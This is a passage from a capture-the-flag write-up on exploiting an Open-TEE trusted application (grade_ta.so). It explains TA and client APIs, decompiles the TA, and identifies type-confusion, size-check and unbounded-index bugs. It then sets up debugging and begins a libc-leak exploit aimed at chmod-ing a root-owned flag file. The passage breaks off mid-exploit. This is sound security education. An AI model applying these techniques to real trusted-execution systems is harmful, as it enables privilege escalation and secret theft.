there is no need to use any dedicated synchronization mechanisms to maintain consistency of any ta instance memory. the sequential execution of entry points inherently guarantees this consistency.\n3.2 client (ree) to ta (tee) communication okay, now we know enough about tas. let\u0026rsquo;s see how we can write a client to communicate with tas. we will use the sha1 example again:\n#include \u0026#34;tee_client_api.h\u0026#34; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; static const teec_uuid uuid = { 0x12345678, 0x8765, 0x4321, { \u0026#39;d\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;g\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;0\u0026#39;} }; /* data buffer sizes */ #define data_size 256 #define sha1_size 20 /* hash ta command ids for this applet */ #define hash_update 0x00000001 #define hash_do_final 0x00000002 #define hash_reset 0x00000003 /* hash algoithm */ #define hash_md5 0x00000001 #define hash_sha1 0x00000002 int main() { teec_context context; teec_session session; teec_operation operation; teec_sharedmemory in_mem; teec_sharedmemory out_mem; teec_result tee_rv; char data[data_size]; uint8_t sha1[sha1_size]; int i; printf(\u0026#34;\\nstart: example sha1 calc app\\n\u0026#34;); /* initialize data stuctures */ memset((void *)\u0026amp;in_mem, 0, sizeof(in_mem)); memset((void *)\u0026amp;out_mem, 0, sizeof(out_mem)); memset((void *)\u0026amp;operation, 0, sizeof(operation)); memset(data, \u0026#39;y\u0026#39;, data_size); memset(sha1, 0, sha1_size); /* initialize context towards tee */ printf(\u0026#34;initializing context: \u0026#34;); tee_rv = teec_initializecontext(null, \u0026amp;context); if (tee_rv != teec_success) { printf(\u0026#34;teec_initializecontext failed: 0x%x\\n\u0026#34;, tee_rv); goto end_1; } else { printf(\u0026#34;initialized\\n\u0026#34;); } /* open session towards digest ta by specifying the correct uuid */ operation.paramtypes = teec_param_types(teec_value_input, teec_none, teec_none, teec_none); operation.params[0].value.a = hash_sha1; /* open session is expecting hash algorithm */ printf(\u0026#34;openning session: \u0026#34;); tee_rv = teec_opensession(\u0026amp;context, \u0026amp;session, \u0026amp;uuid, teec_login_public, null, \u0026amp;operation, null); if (tee_rv != teec_success) { printf(\u0026#34;teec_opensession failed: 0x%x\\n\u0026#34;, tee_rv); goto end_2; } else { printf(\u0026#34;opened\\n\u0026#34;); } /* memory management and teec_invokecommand() */ /* cleanup used connection/resources */ end_4: printf(\u0026#34;releasing shared out memory..\\n\u0026#34;); teec_releasesharedmemory(\u0026amp;out_mem); end_3: printf(\u0026#34;releasing shared in memory..\\n\u0026#34;); teec_releasesharedmemory(\u0026amp;in_mem); printf(\u0026#34;closing session..\\n\u0026#34;); teec_closesession(\u0026amp;session); end_2: printf(\u0026#34;finalizing ctx..\\n\u0026#34;); teec_finalizecontext(\u0026amp;context); end_1: printf(\u0026#34;end: example sha1 calc app\\n\\n\u0026#34;); exit(tee_rv); } the entry point functions that we mentioned in the tas api are 1-to-1 mapped to functions available to clients through the client api:\nta_opensessionentrypoint \u0026lt;-\u0026gt; teec_opensession ta_closesessionentrypoint \u0026lt;-\u0026gt; teec_closesession ta_invokecommandentrypoint \u0026lt;-\u0026gt; teec_invokecommand the entry points ta_createentrypoint and ta_destroyentrypoint do not directly map to any client api. this is because when teec_opensession is invoked, a ta instance will be created if no ta instance exists.\nyou might stumble upon on some other functions, such as tee_opentasession, tee_invoketacommand, or tee_closetasession. these are apis available within the tee only. generally, the prefix tee_ is used for apis inside the tee and the prefix teec_ for apis available to clients that are running in the ree. the reason that the tee_opentasession, tee_invoketacommand, and tee_closetasession functions exist is that ta-to-ta communication is also possible and takes place entirely within the tee. however, ta-to-ta communication is not something we will deepen any further here.\n3.3 parameters and ta commands great! at this point we know:\nthe structure of a ta the lifecycle of the ta how to communicate with the ta however, there is one important thing left to cover. and that is parameters passed from the client to the ta. since our goal is to exploit a ta, our attack surface is more or less the parameters and commands that the ta expects. let\u0026rsquo;s focus on the ta_opensessionentrypoint and ta_invokecommandentrypoint implemented by the digest example ta:\ntee_result ta_export ta_opensessionentrypoint(uint32_t paramtypes, tee_param params[4], void **sessioncontext) { algorithm_identifier hash; ot_log(log_err, \u0026#34;calling the open session entry point\u0026#34;); if (tee_param_type_get(paramtypes, 0) != tee_param_type_value_input) { ot_log(log_err, \u0026#34;bad parameter at index 0: expexted value input\u0026#34;); return tee_error_bad_parameters; } switch (params[0].value.a) { case hash_md5: hash = tee_alg_md5; break; case hash_sha1: hash = tee_alg_sha1; break; default: ot_log(log_err, \u0026#34;unknow hash algorithm\u0026#34;); return tee_error_bad_parameters; } return tee_allocateoperation((tee_operationhandle *)sessioncontext, hash, tee_mode_digest, 0); } tee_result ta_export ta_invokecommandentrypoint(void *sessioncontext, uint32_t commandid, uint32_t paramtypes, tee_param params[4]) { tee_result tee_rv = tee_success; ot_log(log_err, \u0026#34;calling the invoke command entry point\u0026#34;); if (commandid == hash_reset) { tee_resetoperation(sessioncontext); } else if (commandid == hash_update) { if (tee_param_type_get(paramtypes, 0) != tee_param_type_memref_input) { ot_log(log_err, \u0026#34;bad parameter at index 0: expexted memory input\u0026#34;); return tee_error_bad_parameters; } tee_digestupdate(sessioncontext, params[0].memref.buffer, params[0].memref.size); } else if (commandid == hash_do_final) { if (tee_param_type_get(paramtypes, 0) != tee_param_type_none \u0026amp;\u0026amp; tee_param_type_get(paramtypes, 0) != tee_param_type_memref_input) { ot_log(log_err, \u0026#34;bad parameter at index 0: expexted memory input\u0026#34;); return tee_error_bad_parameters; } if (tee_param_type_get(paramtypes, 1) != tee_param_type_memref_output) { ot_log(log_err, \u0026#34;bad parameter at index 1: expexted memory output\u0026#34;); return tee_error_bad_parameters; } tee_rv = tee_digestdofinal(sessioncontext, params[0].memref.buffer, params[0].memref.size, params[1].memref.buffer, \u0026amp;params[1].memref.size); } else { ot_log(log_err, \u0026#34;unknow command id\u0026#34;); tee_rv = tee_error_bad_parameters; } return tee_rv; } when a client opens a session on a ta or invokes a command, the client can send operation parameters to the ta. the parameters encode the data associated with the operation. up to four parameters can be sent in an operation. each parameter can be individually typed by the client as a value parameter, or a memory reference parameter. each parameter is also tagged with a direction of data flow (input, output, or both input and output).\nvalue parameters carry two 32-bit integers (teec_value).\nmemory reference parameters, carry a pointer to a client-owned memory buffer (teec_registeredmemoryreference or teec_tempmemoryreference). (for output memory references, there is a built-in mechanism for the tas to report the necessary size of the buffer in case of a too-short buffer.) note that memory reference parameters typically point to memory owned by the client and shared with the ta for the duration of the operation. this is especially useful in the case of ree clients to minimize the number of memory copies and the data footprint in case a ta needs to deal with large data buffers. however, it can also have security implications as the memory is shared between the client running in the ree and the ta running in the tee!\na rogue client may well change the content of the shared memory buffer at any time, even between two consecutive memory accesses by the ta. this means that the ta needs to be carefully written to avoid any security problem if this happens and deal with toctou vulnerabilities that may arise because of this. if values in the buffer are security critical, the ta should always read data only once from a shared buffer and then validate it. it must not assume that data written to the buffer can be read unchanged later on. the data should be copied to a ta instance-owned buffer.\n// teec_operation defines the payload of either an open session or invoke command typedef struct { uint32_t started; /*!\u0026lt; must set to zero if the client may try to cancel the operation */ uint32_t paramtypes; /*!\u0026lt; encodes the type of each parameter that is being transferred */ teec_parameter params[4]; /*!\u0026lt; an array of 4 possible paramaters to share with ta */ void *imp; //implementation defined } teec_operation; typedef union { teec_tempmemoryreference tmpref; teec_registeredmemoryreference memref; teec_value value; } teec_parameter; // value parameter typedef struct { uint32_t a; uint32_t b; } teec_value; // uses a pre-registered memory or pre-allocated memory block typedef struct { teec_sharedmemory *parent; /*!\u0026lt; either a whole or partial memory reference */ size_t size; /*!\u0026lt; the size of the referenced memory region, in bytes */ size_t offset; /*!\u0026lt; the offset in bytes of the referenced memory region */ } teec_registeredmemoryreference; // a temporary memory reference typedef struct { void *buffer; /*!\u0026lt; pointer to the first byte of a buffer that needs to be referenced */ size_t size; /*!\u0026lt; size of the referenced memory region */ } teec_tempmemoryreference; memory references can be either a registered memory reference or a temporary memory reference.\na registered memory reference is a region within a block of shared memory that was created before the (open session or invoke command) operation.\na temporary memory reference directly specifies a buffer of memory owned by the ca, which is temporarily registered by the tee client api for the duration of the operation being performed.\ngenerally, a memory reference is a range of bytes which is actually shared (between the ca and ta) for a particular operation. a memory reference is described by either a teec_memoryreference or teec_tempmemoryreference structure as shown above. it can specify either:\na whole shared memory block. (teec_memoryreference) a range of bytes within a shared memory block. (teec_memoryreference) a pointer to a buffer of memory owned by the client, in which case this buffer is temporarily registered for the duration of the operation (teec_tempmemoryreference) the memory reference also specifies the direction in which data flows as it can be marked as input (client-to-ta), output (ta-to-client), or both.\na shared memory block is a region of memory allocated in the context of the client memory space that can be used to transfer data between that ca and a ta. a shared memory block can either be existing ca memory which is subsequently registered with the tee client api, or memory which is allocated on behalf of the ca using the tee client api. a shared memory block can be registered or allocated once and then used multiple times such as in multiple commands, and even in multiple sessions, provided they exist within the scope of the tee context in which the shared memory was created. overlapping shared memory registrations are allowed and a single region of client memory may be registered multiple times.\n// a shared memory block that has been registered or allocated typedef struct { void *buffer; /*!\u0026lt; pointer to a memory buffer that is shared with tee */ size_t size; /*!\u0026lt; the size of the memory buffer in bytes */ uint32_t flags; /*!\u0026lt; bit vector that can contain teec_mem_input or teec_mem_output or both */ void *imp; // implementation defined } teec_sharedmemory; with all that said, let\u0026rsquo;s see how the sha1 client now communicates with the digest ta:\nint main() { teec_context context; teec_session session; teec_operation operation; teec_sharedmemory in_mem; teec_sharedmemory out_mem; teec_result tee_rv; char data[data_size]; uint8_t sha1[sha1_size]; int i; printf(\u0026#34;\\nstart: example sha1 calc app\\n\u0026#34;); /* ... initialize data stuctures ... */ /* ... initialize context towards tee using teec_initializecontext() ... */ /* open session towards digest ta by specifying the correct uuid */ operation.paramtypes = teec_param_types(teec_value_input, teec_none, teec_none, teec_none); operation.params[0].value.a = hash_sha1; /* open session is expecting hash algorithm */ printf(\u0026#34;openning session: \u0026#34;); tee_rv = teec_opensession(\u0026amp;context, \u0026amp;session, \u0026amp;uuid, teec_login_public, null, \u0026amp;operation, null); if (tee_rv != teec_success) { printf(\u0026#34;teec_opensession failed: 0x%x\\n\u0026#34;, tee_rv); goto end_2; } else { printf(\u0026#34;opened\\n\u0026#34;); } /* register shared memory for input */ in_mem.buffer = data; in_mem.size = data_size; in_mem.flags = teec_mem_input; tee_rv = teec_registersharedmemory(\u0026amp;context, \u0026amp;in_mem); if (tee_rv != tee_success) { printf(\u0026#34;failed to register data shared memory\\n\u0026#34;); goto end_3; } printf(\u0026#34;registered in mem..\\n\u0026#34;); /* invoke command from digest ta */ operation.paramtypes = teec_param_types(teec_memref_whole, teec_none, teec_none, teec_none); operation.params[0].memref.parent = \u0026amp;in_mem; printf(\u0026#34;invoking command: update sha1: \u0026#34;); tee_rv = teec_invokecommand(\u0026amp;session, hash_update, \u0026amp;operation, null); if (tee_rv != teec_success) { printf(\u0026#34;teec_invokecommand failed: 0x%x\\n\u0026#34;, tee_rv); goto end_3; } else { printf(\u0026#34;done\\n\u0026#34;); } /* register shared memory for output */ out_mem.buffer = sha1; out_mem.size = sha1_size; out_mem.flags = teec_mem_output; tee_rv = teec_registersharedmemory(\u0026amp;context, \u0026amp;out_mem); if (tee_rv != tee_success) { printf(\u0026#34;failed to allocate sha1 shared memory\\n\u0026#34;); goto end_3; } printf(\u0026#34;registered out mem..\\n\u0026#34;); /* invoke second time from digest ta: * send some more data to calculate the hash over, this will be added to the original hash. * this is not strictly needed it is a test for passing 2 memref params in a single * operation */ memset(data, \u0026#39;z\u0026#39;, data_size); operation.paramtypes = teec_param_types(teec_memref_whole, teec_memref_whole, teec_none, teec_none); /* * reuse the original input shared memory, because we have just updated the contents * of the buffer */ operation.params[0].memref.parent = \u0026amp;in_mem; operation.params[1].memref.parent = \u0026amp;out_mem; printf(\u0026#34;invoking command: do final sha1: \u0026#34;); tee_rv = teec_invokecommand(\u0026amp;session, hash_do_final, \u0026amp;operation, null); if (tee_rv != teec_success) { printf(\u0026#34;teec_invokecommand failed: 0x%x\\n\u0026#34;, tee_rv); goto end_4; } else { printf(\u0026#34;done\\n\u0026#34;); } printf(\u0026#34;calculated sha1: \u0026#34;); for (i = 0; i \u0026lt; sha1_size; i++) printf(\u0026#34;%02x\u0026#34;, sha1[i]); printf(\u0026#34;\\n\u0026#34;); /* ... cleanup used connection/resources ... */ exit(tee_rv); } 3.4 security considerations so, with all that said, what can go wrong with tas?\nglobal variables. global variables have the same lifetime as the lifetime of a ta instance and can be accessed between multiple sessions and commands. this can lead to state confusion bugs. to determine whether a given buffer is a memory reference or a buffer owned by the ta itself, the function tee_checkmemoryaccessrights can be used. the uint32_t paramtypes should always be checked against what the ta expects before accessing the parameters themselves (tee_param params[4]). otherwise, vulnerabilities can occur such as type confusion leading to rce within the ta. toctou vulnerabilities can occur as memory reference parameters refer to shared memory between the client (ree) and the ta (tee). 4. reversing revisited! so, with our understanding of tas now, let\u0026rsquo;s reverse grade_ta.so. let\u0026rsquo;s first look at the properties of the ta:\nit is good to know its uuid, that it is a single instance and that it allows multiple sessions. next, we reverse engineer the entry point functions, i.e.:\nta_createentrypoint ta_destroyentrypoint ta_opensessionentrypoint ta_closesessionentrypoint ta_invokecommandentrypoint since we have the source code of open-tee, we can create a helper header for ghidra to parse and have all the data type declarations available. after some reversing, here is the final decompilation of grade_ta.so:\ntee_result ta_createentrypoint(void) { return 0; } void ta_destroyentrypoint(void) { return; } char[256] grade_key; tee_result ta_opensessionentrypoint(uint32_t paramtypes,tee_param *params,void **sessioncontext) { for(int i=0; i\u0026lt;256; i++) grade_key[i] = getrandombyte(); return tee_allocateoperation(sessioncontext,tee_alg_md5,tee_mode_digest,0); } void ta_closesessionentrypoint(void *sessioncontext) { return; } tee_result ta_invokecommandentrypoint(void *sessioncontext,uint32_t commandid,uint32_t paramtypes,tee_param *params) { tee_result tvar1; signedstudent *cursignedstudent; student *curstudent; undefined8 lineno; student *studentarray; student *student2; signedstudent *end; uint32_t idx; student *student1; size_t sz; /* assignments to `lineno` variable have been omitted */ /* sign_class */ if (commandid == sign_class) { curstudent = (student *)(params-\u0026gt;memref).buffer; cursignedstudent = (signedstudent *)params[1].memref.buffer; sz = params[1].memref.size; tvar1 = tee_checkmemoryaccessrights(tee_memory_access_read | tee_memory_access_any_owner, curstudent,(params-\u0026gt;memref).size); if (tvar1 == tee_success) { tvar1 = tee_checkmemoryaccessrights(tee_memory_access_read | tee_memory_access_any_owner,cursignedstudent,sz); end = cursignedstudent + nr_students; if (tvar1 == tee_success) { while( true ) { tee_memmove(cursignedstudent,curstudent,0x10); tee_memmove(cursignedstudent-\u0026gt;lastname,curstudent-\u0026gt;lastname,0x10); cursignedstudent-\u0026gt;grade = curstudent-\u0026gt;grade; cursignedstudent-\u0026gt;sciper = curstudent-\u0026gt;sciper; tvar1 = calculate_signature(sessioncontext,cursignedstudent); if (tvar1 != tee_success) break; cursignedstudent = cursignedstudent + 1; curstudent = curstudent + 1; if (cursignedstudent == end) { return tee_success; } } goto lab_001014fa; } } } else { if (commandid != sign_student) { if (commandid != sign_class_student) { return tee_error_bad_parameters; } /* sign_class_student */ studentarray = (student *)(params-\u0026gt;memref).buffer; cursignedstudent = (signedstudent *)params[1].memref.buffer; sz = params[1].memref.size; idx = params[2].value.a; tvar1 = tee_checkmemoryaccessrights(tee_memory_access_read | tee_memory_access_any_owner, studentarray,(params-\u0026gt;memref).size); if (tvar1 == tee_success) { tvar1 = tee_checkmemoryaccessrights(tee_memory_access_read | tee_memory_access_any_owner, cursignedstudent,sz); if (tvar1 == tee_success) { student1 = studentarray + (int)idx; tee_memmove(cursignedstudent,student1,0x10); tee_memmove(cursignedstudent-\u0026gt;lastname,studentarray[(int)idx].lastname,0x10); cursignedstudent-\u0026gt;grade = student1-\u0026gt;grade; cursignedstudent-\u0026gt;sciper = student1-\u0026gt;sciper; tvar1 = calculate_signature(sessioncontext,cursignedstudent); if (tvar1 == tee_success) { return tee_success; } goto lab_001014fa; } } __syslog_chk(3,1,\u0026#34;%s:%s:%d bad parameters!\u0026#34;,\u0026#34;../../tas/vuln_ta/vuln_ta.c\u0026#34;, \u0026#34;ta_invokecommandentrypoint\u0026#34;,lineno); return tee_error_bad_parameters; } /* sign_student */ student2 = (student *)(params-\u0026gt;memref).buffer; cursignedstudent = (signedstudent *)params[1].memref.buffer; sz = params[1].memref.size; tvar1 = tee_checkmemoryaccessrights(tee_memory_access_read | tee_memory_access_any_owner, student2,(params-\u0026gt;memref).size); if (tvar1 == tee_success) { tvar1 = tee_checkmemoryaccessrights(tee_memory_access_read | tee_memory_access_any_owner, cursignedstudent,sz); if (tvar1 == tee_success) { tee_memmove(cursignedstudent,student2,0x10); tee_memmove(cursignedstudent-\u0026gt;lastname,student2-\u0026gt;lastname,0x10); cursignedstudent-\u0026gt;grade = student2-\u0026gt;grade; cursignedstudent-\u0026gt;sciper = student2-\u0026gt;sciper; tvar1 = calculate_signature(sessioncontext,cursignedstudent); if (tvar1 == tee_success) { return tee_success; } lab_001014fa: __syslog_chk(3,1,\u0026#34;%s:%s:%d signature calculation failed!\u0026#34;,\u0026#34;../../tas/vuln_ta/vuln_ta.c\u0026#34;, \u0026#34;ta_invokecommandentrypoint\u0026#34;,lineno); return tvar1; } } } __syslog_chk(3,1,\u0026#34;%s:%s:%d bad parameters!\u0026#34;,\u0026#34;../../tas/vuln_ta/vuln_ta.c\u0026#34;, \u0026#34;ta_invokecommandentrypoint\u0026#34;,lineno); return tee_error_bad_parameters; } tee_result calculate_signature(void *sessioncontext,signedstudent *signedstudent) { tee_result tvar1; long in_fs_offset; size_t local_50; undefined hash [24]; long local_30; tvar1 = tee_error_security; local_30 = *(long *)(in_fs_offset + 0x28); if (signedstudent-\u0026gt;grade - 1u \u0026lt; 6) { tee_digestupdate(sessioncontext,signedstudent,0x10); tee_digestupdate(sessioncontext,signedstudent-\u0026gt;lastname,0x10); tee_digestupdate(sessioncontext,\u0026amp;signedstudent-\u0026gt;grade,4); tee_digestupdate(sessioncontext,grade_key,0x100); local_50 = 0x10; printf(\u0026#34;address of sig %p\\n\u0026#34;); tvar1 = tee_digestdofinal(sessioncontext,(void *)0x0,0,hash,\u0026amp;local_50); printf(\u0026#34;hash: %s\\n\u0026#34;,hash); tee_memmove(signedstudent-\u0026gt;signature,hash,(uint32_t)local_50); printf(\u0026#34;hash length: %d\\n\u0026#34;,local_50); } if (local_30 == *(long *)(in_fs_offset + 0x28)) { //stack canary check return tvar1; } __stack_chk_fail(); } the main takeaways are:\nta_opensessionentrypoint initializes some array with random data and prepares the ta for md5 hashing ta_invokecommandentrypoint accepts 3 commands: sign_class. this command signs a whole class of students, i.e. nr_students students. params[0] is a memory reference to struct student params[1] is a memory reference to struct signedstudent sign_class_student. this command signs the given student at the given index. params[0] is a memory reference to struct student params[1] is a memory reference to struct signedstudent params[2] is a value parameter and is used as an index in the params[0] buffer. sign_student. this command signs the given student using memory references. params[0] is a memory reference to struct student params[1] is a memory reference to struct signedstudent 4.1 identifying the bugs now, we have fully reversed the ta and know its functionality. next step is to spot the bugs. the first major bug is that no command checks the type of arguments and their data flow direction. this is really really really bad as type confusion is possible in all commands. the following bugs are also present:\nin sign_class, the size is not checked correctly. the line end = cursignedstudent + nr_students means that the given memory reference is always assumed to contain nr_students*sizeof(struct student) bytes. in sign_class_student, there is no bounds checking on the index. this leads to an arbitrary read. 5. detour! environment setup great! at this point we have analyzed the ta and know where the bugs are. next step is to start poking the ta by writing a client application, running it, and debugging things! in this challenge a dockerfile was provided. this dockerfile is based on the install instructions of open-tee. we augment the dockerfile a bit as shown below to facilitate easier debugging:\nfane@ctf-box:~/ctfs/lakectf23/trustmee-replay$ git diff --no-index challenge-desc/dockerfile dockerfile diff --git a/challenge-desc/dockerfile b/dockerfile index eedd449..fdeb85d 100644 --- a/challenge-desc/dockerfile +++ b/dockerfile @@ -1,7 +1,21 @@ -# docker build -t trustmee . \u0026amp;\u0026amp; docker run --rm -it ctf trustmee \u0026amp;\u0026amp; docker exec -it -u ctf [docker_id] /bin/bash +# docker build -t trustmee . +# +# docker run -v ./solution:/home/ctf/solution --cap-add=sys_ptrace --rm -it --name trustmee_1 trustmee +# * --cap-add=sys_ptrace is used so that we can run gdb inside +# * mounting a volume for easier exploit development +# to pwn the challenge: +# docker exec -it -u ctf trustmee_1 /bin/bash +# to debug the challenge +# docker exec -it -u root trustmee_1 /bin/bash from ubuntu:22.04@sha256:b492494d8e0113c4ad3fe4528a4b5ff89faa5331f7d52c5c138196f69ce176a6 +# fix locales +env lang en_us.utf8 +run apt-get update \u0026amp;\u0026amp; apt-get install -y locales +run localedef -i en_us -c -f utf-8 -a /usr/share/locale/locale.alias en_us.utf-8 + # dependencies +run apt-get install -y gdb run apt-get update \u0026amp;\u0026amp; \\ apt-get install -y wget xinetd cmake build-essential unzip git dropbear rsync openssh-client libcap2-bin python3 python3-pip \u0026amp;\u0026amp; apt-get clean @@ -9,6 +23,12 @@ run useradd -d /home/ctf/ -m -s /bin/bash ctf \u0026amp;\u0026amp; passwd -d ctf workdir /home/ctf +# setup pwndbg +run git clone https://github.com/pwndbg/pwndbg +workdir /home/ctf/pwndbg +run ./setup.sh +workdir /home/ctf/ + # clone and install opentee run apt-get install -y build-essential git pkg-config uuid-dev libelf-dev wget curl autoconf automake libtool libfuse-dev @@ -45,6 +65,9 @@ run chmod +x /opt/opentee/lib/tas/grade_ta.so copy opentee.conf /etc/ run ln -s /usr/local/lib/libmbedcrypto.so.3.1.0 /opt/opentee/lib/libmbedcrypto.so.11 +env open_tee_path /opt/opentee +env ld_library_path=\u0026#34;${ld_library_path}:$open_tee_path/lib\u0026#34; + # copy flag copy flag.txt /opt/opentee/ run chmod 000 /opt/opentee/flag.txt we first build the docker image with the command docker build -t trustmee .. then, we can run the image with the command docker run -v ./solution:/home/ctf/solution --cap-add=sys_ptrace --rm -it --name trustmee_1 trustmee. running the image should produce no output and the terminal should seem like \u0026ldquo;hanging\u0026rdquo;, since tail -f /dev/null is the last command executed by the docker\u0026rsquo;s entrypoint. attaching a volume makes ca development also easier.\nnext, in a new terminal, we can attach to the challenge using docker exec -it -u root trustmee_1 /bin/bash. here is how the environment looks like:\n5.1 creating a client application (ca) in this challenge, we are given a starting point as we are provided with a minimal client application (grade_ca.c) shown below. however, even without this starting point, we already learnt enough to be able to build it on our own 🙃\n// grade_ca.c #include \u0026#34;tee_client_api.h\u0026#34; #include \u0026#34;grade_ca.h\u0026#34; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; static const teec_uuid uuid = { 0x11223344, 0xa710, 0x469e, { 0xac, 0xc8, 0x5e, 0xdf, 0x8c, 0x85, 0x90, 0xe1 } }; int main() { teec_context context; teec_session session; teec_operation operation; teec_sharedmemory in_mem; teec_sharedmemory out_mem; teec_result tee_rv; memset((void *)\u0026amp;in_mem, 0, sizeof(in_mem)); memset((void *)\u0026amp;operation, 0, sizeof(operation)); printf(\u0026#34;initializing context: \u0026#34;); tee_rv = teec_initializecontext(null, \u0026amp;context); if (tee_rv != teec_success) { printf(\u0026#34;teec_initializecontext failed: 0x%x\\n\u0026#34;, tee_rv); exit(0); } else { printf(\u0026#34;initialized\\n\u0026#34;); } // connect to the ta printf(\u0026#34;openning session: \u0026#34;); tee_rv = teec_opensession(\u0026amp;context, \u0026amp;session, \u0026amp;uuid, teec_login_public, null, \u0026amp;operation, null); if (tee_rv != teec_success) { printf(\u0026#34;teec_opensession failed: 0x%x\\n\u0026#34;, tee_rv); exit(0); } else { printf(\u0026#34;opened\\n\u0026#34;); } // setup memory for the input/output classes struct studentclass* studentclassinst = (struct studentclass*)malloc(sizeof(struct studentclass)); struct signedstudentclass* signedstudentclassinst = (struct signedstudentclass*)malloc(sizeof(struct signedstudentclass)); memset(studentclassinst, 0, sizeof(struct studentclass)); memset(signedstudentclassinst, 0, sizeof(struct signedstudentclass)); studentclassinst-\u0026gt;students[0].grade = 6; memset(studentclassinst-\u0026gt;students[0].firstname, \u0026#39;a\u0026#39;, name_len-1); memset(studentclassinst-\u0026gt;students[0].lastname, \u0026#39;b\u0026#39;, name_len-1); in_mem.buffer = (void*)studentclassinst; in_mem.size = sizeof(struct studentclass); in_mem.flags = teec_mem_input; // register shared memory, allows us to read data from tee or read data from it tee_rv = teec_registersharedmemory(\u0026amp;context, \u0026amp;in_mem); if (tee_rv != tee_success) { printf(\u0026#34;failed to register studentclass shared memory\\n\u0026#34;); exit(0); } printf(\u0026#34;registered shared memory for student class\\n\u0026#34;); out_mem.buffer = (void*)signedstudentclassinst; out_mem.size = sizeof(struct signedstudentclass); out_mem.flags = teec_mem_output; tee_rv = teec_registersharedmemory(\u0026amp;context, \u0026amp;out_mem); if (tee_rv != tee_success) { printf(\u0026#34;failed to register signed studentclass memory\\n\u0026#34;); exit(0); } /* @todo: implement actual logic to sign student grades. */ } the missing part here is how to compile it. we make a simple makefile for it:\nopen_tee_path=/opt/opentee cflags += -g -wall -i/home/ctf/opentee/libtee/include -i./ ldadd += -l$(open_tee_path)/lib/ -ltee .phony: all all: grade_ca grade_ca: grade_ca.c grade_ca.h $(cc) $(cflags) -o $@ $^ $(ldadd) .phony: clean clean: rm -f *.o grade_ca 5.2 debugging let\u0026rsquo;s close the environment setup chapter by talking about debugging.\nif we want to debug our client application, the process is the same as with any other c program that we write. the ca does not differ to any regular application as it is running in the ree. if we want to debug the ta, we attach to the docker container with the root user (docker exec -it -u root trustmee_1 /bin/bash). there are two ways to debug tas:\n5.2.1 debugging from the very beginning in this method we want to attach to the ta from the very beginning, including being able to debug the ta_createentrypoint, i.e. instance creation. to do so, we will attach gdb to the open-tee framework. new ta instances are spawned as new processes and run in an endless loop awaiting for tasks (i.e. commands). here is how it is done internally in open-tee:\nint lib_main_loop(struct core_control *ctl_params) { //... new_proc_pid = clone(ta_process_loop, child_stack + child_stack_size, sigchld | clone_parent, \u0026amp;ta_loop_args); //... } int ta_process_loop(void *arg) { //... load_ta(path, \u0026amp;interface); //will perform dlopen() and bring the ta into memory //... pthread_attr_setdetachstate(\u0026amp;attr, pthread_create_detached); pthread_create(\u0026amp;ta_logic_thread, \u0026amp;attr, ta_internal_thread, open_msg); } void *ta_internal_thread(void *arg) { //... for (;;) { //wait for tasks //execute tasks (e.g. open a session, invoke command, etc.) //repeat } //... } so, we will spawn gdb with the command gdb /opt/opentee/bin/opentee-engine `pgrep -f tee_launcher` . next, we will use the following gdb commands:\nset follow-fork-mode child b ta_internal_thread command b ta_createentrypoint end continue afterwards, using our client application, we can load the ta and debug it from the very beginning.\n5.2.2 attaching a debugger to a ta instance in this case, a ta instance already exists and we want to attach to it. the ta is shown when we run ps aux as a process named grade_ta.so. we simply attach to it via gdb and debugging is possible immediately: gdb /opt/opentee/bin/opentee-engine `pgrep -f grade_ta.so` 6. identifying an exploitation strategy on the machine running this challenge we have userspace access. the flag is located at /opt/opentee/flag.txt and belongs to the root user with all permissions removed:\nctf@42ac3fd4b5ef:/home/ctf/solution$ ls -l /opt/opentee/flag.txt ---------- 1 root root 44 dec 28 21:17 /opt/opentee/flag.txt ctf@42ac3fd4b5ef:/home/ctf/solution$ cat /opt/opentee/flag.txt cat: /opt/opentee/flag.txt: permission denied as we run as the ctf user, we cannot access the flag. our goal will be to exploit the ta and do a chmod 777 /opt/opentee/flag.txt so that later we can dump the flag with cat /opt/opentee/flag.txt. it is worth noting that the ta does not produce any output logs and its stdin/stderr/stdout are redirected to /dev/null:\n7. writing the exploit here is a reminder of the bugs that are in-place:\nthe first major bug is that no ta command checks the type of arguments and their direction. this is really bad as type confusion is possible in all commands. in sign_class, the size is not checked correctly. the line end = cursignedstudent + nr_students means that the given memory reference is always assumed to contain nr_students*sizeof(struct student) bytes. in sign_class_student, there is no bounds checking on the index. this leads to an arbitrary read. 7.1 libc.so leak we will start with 3. — the arbitrary read:\n/* sign_class_student */ studentarray = (student *)(params-\u0026gt;memref).buffer; cursignedstudent = (signedstudent *)params[1].memref.buffer; idx = params[2].value.a; if (tee_checkmemoryaccessrights(5,studentarray,params[0].memref.size) == tee_success) { if (tee_checkmemoryaccessrights(5,cursignedstudent, params[1].memref.size) == tee_success) { student1 = studentarray + (int)idx; tee_memmove(cursignedstudent,student1,0x10); tee_memmove(cursignedstudent-\u0026gt;lastname,student1-\u0026gt;lastname,0x10); cursignedstudent-\u0026gt;grade = student1-\u0026gt;grade; cursignedstudent-\u0026gt;sciper = student1-\u0026gt;sciper; tvar1 = calculate_signature(sessioncontext,cursignedstudent); } } as you can see, we can use any idx and make student1 point anywhere in memory. the buffer cursignedstudent is a shared memory block that we supply with type teec_mem_output. so, with a single sign_class_student command we can leak 0x28 bytes (excluding the random signature). we will use this primitive to find the base address of libc. to do so, we will initially use idx=0 and insert a breakpoint at tee_memmove(cursignedstudent,student1,0x10):\n$rsi=0x7fc3132b2000 is the address of our shared memory block and belongs to the /dev/shm/5203tttttttttt972022484tttttt1704030777tttt vma. a little further below is the rw- page of ld.so. we will search that page, as it is the nearset one, for pointers in order to leak libc:\nperfect! we find a libc leak at $rsi+0x3000+0x18, which corresponds to the symbol _dl_catch_exception. with some arithmetic, we find out that this symbol is located at libc offset 0x174820. so, if we leak this pointer (_dl_catch_exception=0x7fc3131c0820) we can find the base address of libc!\nmemset((void *)\u0026amp;operation, 0, sizeof(operation)); operation.paramtypes = teec_param_types( teec_memref_whole, teec_memref_whole, teec_value_input, teec_none ); operation.params[0].memref.parent = \u0026amp;in_mem; operation.params[1].memref.parent = \u0026amp;out_mem; // byte offset 0x3018 translates to : // 0x3018/sizeof(struct student) // =0x3018/0x28 // =307=0x133 offset of a `struct student` array. 